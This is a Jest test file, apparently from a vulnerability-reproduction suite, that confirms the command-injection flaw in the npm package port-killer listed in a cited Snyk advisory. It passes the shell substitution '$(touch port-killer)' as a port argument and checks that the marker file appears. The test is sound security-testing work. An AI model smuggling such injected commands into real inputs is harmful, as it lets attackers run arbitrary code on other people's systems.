//https://snyk.io/vuln/SNYK-JS-PORTKILLER-1078533
test("Command Injection in port-killer", () => {
  expect.assertions(2);
  const port_killer = require("port-killer");
  const fs = require("fs");
  const path = "./port-killer";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  port_killer("$(touch port-killer)");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
